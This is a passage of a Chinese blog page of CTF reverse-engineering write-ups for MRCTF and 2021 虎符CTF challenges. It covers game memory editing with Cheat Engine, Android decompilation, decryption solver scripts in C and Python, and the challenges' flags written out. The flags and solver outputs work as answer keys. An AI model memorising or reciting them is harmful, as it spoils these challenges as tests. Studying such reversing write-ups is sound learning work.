class="keyword">int</span> enc[<span class="number">100</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x4d</span>, <span class="number">0x52</span>, <span class="number">0xe2</span>, <span class="number">0x188</span>, <span class="number">0x2b0</span>, <span class="number">0x4b3</span>, <span class="number">0x7a6</span>, <span class="number">0xc8d</span>, <span class="number">0x14a1</span>, <span class="number">0x218d</span>, <span class="number">0x36a7</span>, <span class="number">0x5864</span>, <span class="number">0x8f80</span>, <span class="number">0xe843</span>, <span class="number">0x17827</span>, <span class="number">0x2609d</span>, <span class="number">0x3d926</span>, <span class="number">0x63a38</span>, <span class="number">0xa13c5</span>, <span class="number">0x104e5c</span>, <span class="number">0x1a6252</span>, <span class="number">0x2ab122</span>, <span class="number">0x4513b3</span>, <span class="number">0x6fc534</span>, <span class="number">0xb4d955</span>, <span class="number">0x1249eb9</span>, <span class="number">0x1d9786d</span>, <span class="number">0x2fe179d</span>, <span class="number">0x4d7906b</span>, <span class="number">0x7d5a841</span>, <span class="number">0xcad38cd</span>, <span class="number">0x1482e18b</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> init = enc[<span class="number">0</span>]+enc[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">flag[<span class="number">0</span>] = enc[<span class="number">0</span>], flag[<span class="number">1</span>] = enc[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">2</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = enc[i]-enc[i<span class="number">-1</span>]-enc[i<span class="number">-2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//MRCTF&#123;C4n_y0u_d3bug_1t?_n0_wa9!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="EzGame"><a href="#EzGame" class="headerlink" title="EzGame"></a>EzGame</h3><p>游戏真好玩。</p><p>之前嘶吼CTF做过一个魔塔的游戏，也是有几个通关条件但更苛刻，但是那个并不是unity3d写的，直接逆向程序看游戏的逻辑找每个关键点还是能分析。这个游戏本身用unity3d写难度就大了很多，还对一个dll进行Themida / Winlicense v3.0.0.0 - 3.0.4.0加壳。</p><p>搞了些时间，没有把程序正常调试起来，开始打用CE的主意。。</p><p>常规的通过星星数的增加，不断再次扫描缩小范围找到存放其值的内存所在的位置。</p><p><img src="https://i.loli.net/2021/04/12/O6b8jr5AfghM9q3.png" alt="image-20210412125603706"></p><p>因为最后获得flag的还有一个条件就是死亡次数不能太多，那就还有一个记录死亡次数的变量，同样的方法找到内存位置。但其它三个条件是否达成标志的内存位置呢。</p><p>这时候我观察我记录下的星星数和死亡次数的内存地址：可以发现这2个内存地址隔的很近，这就让我想到其余判断条件的内存地址也是在这块区域，就在附近。</p><p><img src="https://i.loli.net/2021/04/12/FjxvnrsNSMdKLcD.png" alt="image-20210412130845062"></p><p>开始试探寻找另外三个条件的内存位置。</p><p>因为Eat Cookie是可实现的，所以浏览相关内存区域后我去Eat Cookie，然后看内存变化。</p><p>发现下图中的内存位置变了，然后我以为这个标志是四字节数据，其后面跟着的是6是死亡次数，那再后面的或许就是其余2个条件的标志内存区域吧。</p><p><img src="https://i.loli.net/2021/04/12/f7tDeKoRiP6YsQd.png" alt="image-20210412131401847"></p><p>开始把后面所有的数据作为4字节数据，然后都改为1，回到游戏，发现其余2个条件并没有变为True。。。</p><p>但还有一个条件GoHome也是可以打游戏到达的，到达后再次观察内存变化，发现了端倪，其实3个条件的标志变量是一个字节的数据，也就是存Eat Cookie标志内存地址跟着的2个字节。</p><p>现在把所有条件通过修改内存达成，GetFlag：</p><p><img src="https://i.loli.net/2021/04/12/CrNxG7igVQHTWja.png" alt="image-20210412132340392"></p><p>其实猜也是，不会这样就把flag得到了，，之前嘶吼的魔塔游戏就有很多判断，步数啊，血量，走的路径等各种参数去计算出flag。这个题应该也是这样的。。</p><p>在增加星星数时我之前观察到了后面有8个字节的数据在不断发生变化，而要得到flag就要星星数正确，而星星数又影响那8字节数据，自然想到那8字节数据影响着最后flag。。</p><p>这时候我有2个想法：</p><ul><li><p>一是找方法计算出星星数为105时的8字节数据；</p></li><li><p>二是找到记录所能跳高度的内存位置或记录当前位置的参数，修改后达到外挂一样，将星星数一个一个吃掉。</p></li></ul><p>第二个想法尝试了一下，不断变化位置，并没有在附近的内存中发现变化，倒是发现了记录当前已经跳动步数的内存位置，然后就没有后续了（。。</p><p>然后尝试找出计算8字节数据的方法，，先dump出几组数据观察了一下：发现奇数组和偶数组对应2个不同lfsr结构，关键在于最后一个字节移位（也是一个lfsr结构）后填入新一组的第一个位置。但是不知道每次循环填充到最高的位0或1是怎么计算的决定的。。<br><img src="https://i.loli.net/2021/04/12/DqVs6Xo5rTMIWlA.png" alt="image-20210412135221959"></p><p>其实这里都知道内存的地址了，要是把程序调试起来，通过ce的是什么访问这个地址，得到操作目标数据的指令地址后在调试器中去对应找到关键代码就很简单了，然而这个游戏我没能调试起来。</p><p>但还有一个办法：dump出当时的内存，拖进ida中分析，一样和调试一样。。</p><p>有了这个思路，先是直接定位到最后GetFlag时要进行比较的代码，发现有取出那8字节数据作为key去去进行rc4解密，以为有直接比较key是否正确的地方，但并没有发现。然后又老老实实定位到计算生成key的地方：</p><p><img src="https://i.loli.net/2021/04/12/RC47oJFqrIK2vaN.png" alt="image-20210412184108621"></p><p>上面的算法中有一个未知量，v0，就是要运行的次数，，我是把1-64都打印了出来，在v0 == 8时，得到正确的结果。</p><p>最后就是打印出星星数为105时的目标值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> init[] = &#123;<span class="number">0x4E</span>, <span class="number">0x51</span>, <span class="number">0x14</span>, <span class="number">0xA1</span>, <span class="number">0xFA</span>, <span class="number">0xEE</span>, <span class="number">0xDB</span>, <span class="number">0xEA</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__int64 v2, v3, v4;</span><br><span class="line"><span class="keyword">char</span> v5;</span><br><span class="line"><span class="keyword">unsigned</span> __int64 v6;</span><br><span class="line">__int64 result;</span><br><span class="line"><span class="keyword">int</span> v0 = <span class="number">8</span>, i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v5 = v3++ &amp; <span class="number">0x3f</span>;</span><br><span class="line">v6 = v4 &amp; (*((__int64 *)init));</span><br><span class="line">v4 = (v4 &lt;&lt; <span class="number">1</span>) | (v4 &gt;&gt; <span class="number">63</span>);</span><br><span class="line">v2 ^= v6 &gt;&gt; v5; </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">while</span>(v3 &lt; <span class="number">64</span>);</span><br><span class="line"></span><br><span class="line">result = v2 | <span class="number">2</span>* (*((__int64 *)init));</span><br><span class="line">(*((__int64 *)init)) = result;</span><br><span class="line"></span><br><span class="line">--v0;</span><br><span class="line">&#125;<span class="keyword">while</span>(v0);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &lt;= <span class="number">105</span>; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">fun();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%x "</span>, init[j]);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//dd b7 d5 3b 45 51 84 ea</span></span><br></pre></td></tr></table></figure><p>修改游戏内存，得到flag。</p><p><img src="https://i.loli.net/2021/04/12/p2RIdzDjMWwXZqG.png" alt="image-20210412184539407"></p><h3 id="MR-CheckIN"><a href="#MR-CheckIN" class="headerlink" title="MR_CheckIN"></a>MR_CheckIN</h3><p>安卓题，jeb反编译后，在MainActivity的onCreate方法找到调用了一个监听文本框输入的类。也就是当我们输入password长度为39时才将SIGNIN按钮启动。。</p><p><img src="https://i.loli.net/2021/04/12/RKEgf5mp1rlGXyQ.png" alt="image-20210412185333718"></p><p>后面就是处理从文本框输入的内容，username要为MRCTF，然后检查了password的格式MRCTF{}，接着passwd的6-13进行md5加密后与编码的数据比较，这个在线解密一下就好了：<strong>Andr01d</strong>，剩下的数据传入check2函数进行运算检查。</p><p><img src="https://i.loli.net/2021/04/12/rtjRiSdXNP5Klcg.png" alt="image-20210412185731359"></p><p>check2函数就是生成一个密钥序列然后与输入异或后与编码数据比较：<br><img src="https://i.loli.net/2021/04/12/r5QGPNgA2azXcWR.png" alt="image-20210412190659182"></p><p>我开始直接把上面生成密钥序列的next方法复制到java中运行，但得到密钥序列一直不对。。</p><p>然后用了最笨的方法，，单步调试一步一步得到密钥序列，其实把最后那个判断条件改一下，得到这个序列就方便了。。</p><p>密钥序列：<strong>[49, 49, 49, 50, 53, 52, 55, 48, 54, 48, 53, 48, 48, 52, 48, 48, 48, 53, 50, 48, 49, 48, 48, 48, 48]</strong></p><p>最后异或一下：</p><p><img src="https://i.loli.net/2021/04/12/sGjmcnix6TPkBAq.png" alt="image-20210412191628542"></p><h3 id="古神的低语"><a href="#古神的低语" class="headerlink" title="古神的低语"></a>古神的低语</h3><p>魔改过的平坦化混淆，，用脚本没去掉，然后就是硬看了。。</p><p><img src="https://i.loli.net/2021/04/14/mJj6gvVdWCaYAhw.png" alt="image-20210413181523944"></p><p>开始对输入的一些操作，判断长度和对username进行bytes.fromhex()的操作。</p><p><img src="https://i.loli.net/2021/04/12/EW7mQ3A2kHTtMJc.png" alt="image-20210412193243190"></p><p>之后就是那个很大的函数了，记为mixFuction，也是整个题的关键，，什么操作都调用了它。</p><p>首先第一次调试的时候，在内存中找到了二张表，搜索到这是祖冲之序列密码，有密钥与iv。再仔细分析第一次调用那个mixFuction函数，发现传入username的hex.decode的形式和ezivforefolwenc，猜测这是将username作为key，ezivforefolwenc作为iv，进行祖冲序列密码的初始化。</p><p>然后第二次调用mixFunction，传入参数8和一个指针，单步步过这个函数发现生成32字节数据，从传入的参数为8，和这个序列密码的生成密钥流的性质：32位4字节密钥为一个生成单元。我又自己用这个相同的密钥和iv模拟了生成的密钥，然后对比，，果然一样。。</p><p><img src="https://i.loli.net/2021/04/12/yiX6IH4obUWvgTM.png" alt="image-20210412194741393"></p><p>接着调用的一个mixFunction进行了赋值操作，直接单步步过后看变化。</p><p>继续又调用的两次mixFunction传入一个key和输入的passwd，分2次加密，每次加密16字节，分组密码的特征了。单步步入调试mixFunction很卡，，直接对passwd下内存访问断点，发现开始用传入的key和passwd进行一个异或操作，继续F9，又断下来，，一个字节替换操作，而从盒子看，明显aes的s盒，哈哈被发现了，那之前就是初始轮了。</p><p>后面是用之前生成的密钥流加密：</p><p><img src="https://i.loli.net/2021/04/12/65g7iN1jonLYG2D.png" alt="image-20210412200958875"></p><p>其中又调用了mixFunction函数对密钥流进行一个序列操作，调试到关键位置，得到加密算法。</p><p><img src="https://i.loli.net/2021/04/12/oG3p7UKMH2av6BN.png" alt="image-20210412202528482"></p><p>最后还有一个mixFunction：循环移位操作。</p><p><img src="https://i.loli.net/2021/04/12/b72eDcHfSz43XPd.png" alt="image-20210412203433118"></p><p>最后整体上，整个加密就类似tea结构，解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>][<span class="number">256</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ENC[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">208</span>, <span class="number">161</span>, <span class="number">129</span>, <span class="number">188</span>, <span class="number">124</span>, <span class="number">155</span>,   <span class="number">2</span>, <span class="number">228</span>,  <span class="number">47</span>,  <span class="number">51</span>, </span><br><span class="line">   <span class="number">54</span>, <span class="number">232</span>, <span class="number">187</span>,  <span class="number">18</span>, <span class="number">146</span>, <span class="number">244</span>,  <span class="number">18</span>, <span class="number">178</span>, <span class="number">177</span>, <span class="number">115</span>, </span><br><span class="line">  <span class="number">243</span>, <span class="number">219</span>, <span class="number">248</span>, <span class="number">195</span>, <span class="number">252</span>, <span class="number">223</span>, <span class="number">212</span>,  <span class="number">80</span>, <span class="number">220</span>, <span class="number">140</span>, </span><br><span class="line">   <span class="number">91</span>, <span class="number">233</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc_stream[] = &#123;<span class="number">3691317505</span>, <span class="number">783378847</span>, <span class="number">3109790973</span>, <span class="number">2450366240</span>,</span><br><span class="line"> <span class="number">1882631107</span>, <span class="number">1581884682</span>, <span class="number">2916488768</span>, <span class="number">1817239551</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">mul_2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cnt += ((a&gt;&gt;i)&amp;<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf("%d", cnt);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cnt%<span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> a*<span class="number">2</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> ((a*<span class="number">2</span>) | <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gen_key</span><span class="params">(<span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i, j, v43, v44;</span><br><span class="line"></span><br><span class="line">v44 = enc_stream[<span class="number">2</span>*index], v43 = enc_stream[<span class="number">2</span>*index+<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v44 = mul_2(v43);</span><br><span class="line">v43 = mul_2(v44);</span><br><span class="line"></span><br><span class="line">key[index][i][<span class="number">0</span>] = v44 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">key[index][i][<span class="number">1</span>] = v43 &lt;&lt; <span class="number">18</span>;</span><br><span class="line">key[index][i][<span class="number">2</span>] = v43 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">key[index][i][<span class="number">3</span>] = v44 &lt;&lt; <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">ror</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = (a &gt;&gt; i) | (a &lt;&lt; (<span class="number">0x20</span>-i));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">gen_key(i);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> tmp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *enc = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ENC+<span class="number">8</span>*i);</span><br><span class="line">tmp = enc[<span class="number">1</span>];</span><br><span class="line">enc[<span class="number">1</span>] = enc[<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] ^= tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">enc[<span class="number">1</span>] += ror(enc[<span class="number">0</span>], j&amp;<span class="number">0x1f</span>) ^ key[i][j][<span class="number">1</span>] | key[i][j][<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] += ror(enc[<span class="number">1</span>], j&amp;<span class="number">0x1f</span>) ^ key[i][j][<span class="number">3</span>] | key[i][j][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf("%x ", ror(0x00C68E92E3, 2));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, "</span>, ENC[i]); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>aes解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>cry = AES.new(<span class="string">b"ezkeyforenc"</span>+bytes(<span class="number">5</span>), AES.MODE_ECB)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = cry.decrypt(bytes([<span class="number">138</span>, <span class="number">103</span>, <span class="number">149</span>, <span class="number">61</span>, <span class="number">251</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">155</span>, <span class="number">4</span>, <span class="number">129</span>, <span class="number">228</span>, <span class="number">119</span>, <span class="number">7</span>, <span class="number">137</span>, <span class="number">132</span>, <span class="number">118</span>, <span class="number">214</span>, <span class="number">137</span>, <span class="number">47</span>, <span class="number">233</span>, <span class="number">229</span>, <span class="number">148</span>, <span class="number">23</span>, <span class="number">181</span>, <span class="number">45</span>, <span class="number">203</span>, <span class="number">80</span>, <span class="number">45</span>, <span class="number">251</span>, <span class="number">101</span>, <span class="number">6</span>, <span class="number">224</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line"><span class="string">b'really_ez_flatten_obfu_can_u_fix'</span></span><br></pre></td></tr></table></figure><p>最后解密还原得到的一个音频文件，这不杂项。。</p><p>找到这个：</p><p><img src="https://i.loli.net/2021/04/12/JcSsjlAgELORaku.png" alt="image-20210412203830511"></p><p>然后，，，倒放音频听到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2021数字中国创新大赛虎符网络安全</title>
      <link href="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
      <url>/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>第二届虎符CTF，分享一下逆向题解。<a id="more"></a></p><blockquote><p>链接：<a href="https://pan.baidu.com/s/15CH8WMsHoaRmMeIflV3Llg" target="_blank" rel="noopener">https://pan.baidu.com/s/15CH8WMsHoaRmMeIflV3Llg</a><br>提取码：z531<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><h3 id="redemption-code"><a href="#redemption-code" class="headerlink" title="redemption_code"></a>redemption_code</h3><p>32位mips架构动态链接的程序。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403195047229.png" alt="image-20210403195047229"></p><p>因为动态链接运行要指定库路径，这里就直接静态分析，这个题也足够了。</p><p>首先看到对输入字符串处理的第一个函数pre：判断长度后，一个字符串赋值操作，一起传入check。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403200825059.png" alt="image-20210403200825059"></p><p>然后server_check_redemption_code函数：创建14个表，然后我们的输入的字符串作为index在其中以此递增的做标记。最后用上面赋值的字符串作为index依次查表，直到到最后到达最后一个表才成功。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403201314116.png" alt="image-20210403201314116"></p><p>上面如果不好理解的话，可以把要得到的表打印出来看一下就清楚了。</p><p>所以说，要使第一个函数不返回-1，只要我们的输入为赋值字符串的前14个就好了。<strong>Ninja Must Die</strong></p><p>紧接着，又是一个字符串赋值操作加一个check()函数，与前面不同的是这个check()函数的返回值要为7，计算可以知道也就是check()函数最后要寻找21长度的字符串。而赋值的字符串也变了，如何让我们的输入字符串满足2个check()函数呢。</p><p>观察一下第二个字符串的前21位：<strong>I Love Ninja Must Die</strong>，它的后14位正好和第一个check()函数要满足的一样，而它的前7位可以跳过的，也正好满足了返回值要为7。</p><p>所以最后的flag就是：<strong>flag{Ninja Must Die}</strong></p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>程序应该是realse模式编译的，代码都杂合到一起了。做题时注意识别关键代码。</p><p>来到main函数，首先就看到了输入和长度判断，明显的stl模板的string结构。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403204000350.png" alt="image-20210403204000350"></p><p>动调看一下这个结构：</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403205021175.png" alt="image-20210403205021175"></p><p>后面一直到下一次输入的的地方，动态分析下可以快速知道是将我们的输入前7位和后10位分为了2个string来存储。注意看内存。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403205837005.png" alt="image-20210403205837005"></p><p>接下来关键是第二个输入后进行浮点数运算的地方，输入数据经过浮点运算对比正确后继续进行后面的分支。</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403210353368.png" alt="image-20210403210353368"></p><p>我开始直接跳过了这个判断，先看看后面做了什么。</p><p>分析得到下面是用输入的前7位和第二次的输入变换的得到的数据进行异或，</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403211320207.png" alt="image-20210403211320207"></p><p>继续看下面，可以看到输入的rc4结构，且把我们的前7位做了key：</p><p><img src="/2021/04/03/2021%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/image-20210403212129295.png" 